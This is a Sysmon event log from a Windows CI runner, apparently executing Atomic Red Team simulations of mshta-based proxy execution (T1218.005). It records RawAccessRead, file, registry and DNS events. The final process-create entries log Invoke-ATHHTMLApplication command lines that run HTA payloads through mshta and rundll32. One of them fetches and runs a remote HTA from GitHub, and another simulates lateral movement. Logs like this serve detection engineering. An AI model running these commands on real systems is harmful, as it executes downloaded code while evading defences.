"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume1
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume1
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume1
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume1
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume1
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:43 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:43.437
ProcessGuid: {f995aebf-5fa1-6942-6d01-000000000e00}
ProcessId: 9928
Image: C:\Windows\System32\SecurityHealthService.exe
Device: \Device\HarddiskVolume1
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:15 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:15.826
ProcessGuid: {f995aebf-5f77-6942-cc00-000000000e00}
ProcessId: 5888
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:15 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:15.826
ProcessGuid: {f995aebf-5f77-6942-cc00-000000000e00}
ProcessId: 5888
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:05:15 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:05:15.824
ProcessGuid: {f995aebf-5f77-6942-cc00-000000000e00}
ProcessId: 5888
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:58 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:58.077
SourceProcessGUID: {f995aebf-641f-6942-7106-000000000e00}
SourceProcessId: 9724
SourceThreadId: 6496
SourceImage: C:\Windows\system32\compattelrunner.exe
TargetProcessGUID: {f995aebf-5f5c-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\SYSTEM32\aeinv.dll+22b55|C:\Windows\SYSTEM32\aeinv.dll+39fa3|C:\Windows\SYSTEM32\aeinv.dll+74d22|C:\Windows\SYSTEM32\aeinv.dll+48f80|C:\Windows\SYSTEM32\aeinv.dll+53228|C:\Windows\SYSTEM32\aeinv.dll+5365c|C:\Windows\system32\compattelrunner.exe+b57e|C:\Windows\system32\compattelrunner.exe+c7fb|C:\Windows\system32\compattelrunner.exe+1f5b|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:39 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 08:04:39.120
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:33 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:04:31.226
ProcessGuid: {f995aebf-640f-6942-5e06-000000000e00}
ProcessId: 2832
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\regsvr32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:23.551
ProcessGuid: {f995aebf-6407-6942-5106-000000000e00}
ProcessId: 6904
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nbhljub2.dq5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:23.533
ProcessGuid: {f995aebf-6407-6942-5106-000000000e00}
ProcessId: 6904
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nbhljub2.dq5.ps1
CreationUtcTime: 2025-12-17 08:04:23.533
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:23.168
ProcessGuid: {f995aebf-6407-6942-4f06-000000000e00}
ProcessId: 8004
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cnzygn0x.osj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:23.146
ProcessGuid: {f995aebf-6407-6942-4f06-000000000e00}
ProcessId: 8004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cnzygn0x.osj.ps1
CreationUtcTime: 2025-12-17 08:04:23.146
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:22.775
ProcessGuid: {f995aebf-6406-6942-4d06-000000000e00}
ProcessId: 1796
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qvwemwme.xe5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:22.755
ProcessGuid: {f995aebf-6406-6942-4d06-000000000e00}
ProcessId: 1796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qvwemwme.xe5.ps1
CreationUtcTime: 2025-12-17 08:04:22.755
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:22.384
ProcessGuid: {f995aebf-6406-6942-4b06-000000000e00}
ProcessId: 9324
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3iydx1wo.yfi.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:22.362
ProcessGuid: {f995aebf-6406-6942-4b06-000000000e00}
ProcessId: 9324
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3iydx1wo.yfi.ps1
CreationUtcTime: 2025-12-17 08:04:22.362
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:21.986
ProcessGuid: {f995aebf-6405-6942-4906-000000000e00}
ProcessId: 9008
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ypcwgere.4q2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:21.964
ProcessGuid: {f995aebf-6405-6942-4906-000000000e00}
ProcessId: 9008
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ypcwgere.4q2.ps1
CreationUtcTime: 2025-12-17 08:04:21.964
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:21.590
ProcessGuid: {f995aebf-6405-6942-4706-000000000e00}
ProcessId: 5860
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_p2jgqnlv.0zf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:21.567
ProcessGuid: {f995aebf-6405-6942-4706-000000000e00}
ProcessId: 5860
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_p2jgqnlv.0zf.ps1
CreationUtcTime: 2025-12-17 08:04:21.567
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:21.035
ProcessGuid: {f995aebf-6404-6942-4506-000000000e00}
ProcessId: 3628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_v4tkea24.wav.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:21.009
ProcessGuid: {f995aebf-6404-6942-4506-000000000e00}
ProcessId: 3628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_v4tkea24.wav.ps1
CreationUtcTime: 2025-12-17 08:04:21.009
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:18 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:18.653
ProcessGuid: {f995aebf-6402-6942-3d06-000000000e00}
ProcessId: 8092
Image: C:\Windows\System32\svchost.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:15.921
ProcessGuid: {f995aebf-63ff-6942-3806-000000000e00}
ProcessId: 4884
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1kti5gvy.jlp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:15.901
ProcessGuid: {f995aebf-63ff-6942-3806-000000000e00}
ProcessId: 4884
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1kti5gvy.jlp.ps1
CreationUtcTime: 2025-12-17 08:04:15.901
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:14 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:04:14.849
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotiT1218.005.hta
Details: DWORD (0x00000004)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:13.602
ProcessGuid: {f995aebf-63fd-6942-3306-000000000e00}
ProcessId: 1368
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ly4dp5a1.zek.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:13.577
ProcessGuid: {f995aebf-63fd-6942-3306-000000000e00}
ProcessId: 1368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ly4dp5a1.zek.ps1
CreationUtcTime: 2025-12-17 08:04:13.577
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:13.483
ProcessGuid: {f995aebf-63fd-6942-3306-000000000e00}
ProcessId: 1368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:12.953
ProcessGuid: {f995aebf-63fc-6942-3106-000000000e00}
ProcessId: 6512
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pqn1n524.1nu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:12.933
ProcessGuid: {f995aebf-63fc-6942-3106-000000000e00}
ProcessId: 6512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pqn1n524.1nu.ps1
CreationUtcTime: 2025-12-17 08:04:12.933
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:12.837
ProcessGuid: {f995aebf-63fc-6942-3106-000000000e00}
ProcessId: 6512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:12.257
ProcessGuid: {f995aebf-63fc-6942-2d06-000000000e00}
ProcessId: 9776
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_afhuty4h.mp1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:12.233
ProcessGuid: {f995aebf-63fc-6942-2d06-000000000e00}
ProcessId: 9776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_afhuty4h.mp1.ps1
CreationUtcTime: 2025-12-17 08:04:12.233
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:12.138
ProcessGuid: {f995aebf-63fc-6942-2d06-000000000e00}
ProcessId: 9776
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:11.586
ProcessGuid: {f995aebf-63fb-6942-2b06-000000000e00}
ProcessId: 9716
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f4m00a00.xjz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:11.562
ProcessGuid: {f995aebf-63fb-6942-2b06-000000000e00}
ProcessId: 9716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f4m00a00.xjz.ps1
CreationUtcTime: 2025-12-17 08:04:11.562
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:11.475
ProcessGuid: {f995aebf-63fb-6942-2b06-000000000e00}
ProcessId: 9716
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:10.948
ProcessGuid: {f995aebf-63fa-6942-2906-000000000e00}
ProcessId: 7412
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cdbc4h1p.zv2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:10.927
ProcessGuid: {f995aebf-63fa-6942-2906-000000000e00}
ProcessId: 7412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cdbc4h1p.zv2.ps1
CreationUtcTime: 2025-12-17 08:04:10.927
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.835
ProcessGuid: {f995aebf-63fa-6942-2906-000000000e00}
ProcessId: 7412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:10.325
ProcessGuid: {f995aebf-63fa-6942-2706-000000000e00}
ProcessId: 5364
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5j3irlp1.n2y.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:10.297
ProcessGuid: {f995aebf-63fa-6942-2706-000000000e00}
ProcessId: 5364
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5j3irlp1.n2y.ps1
CreationUtcTime: 2025-12-17 08:04:10.297
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:10.203
ProcessGuid: {f995aebf-63fa-6942-2706-000000000e00}
ProcessId: 5364
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}
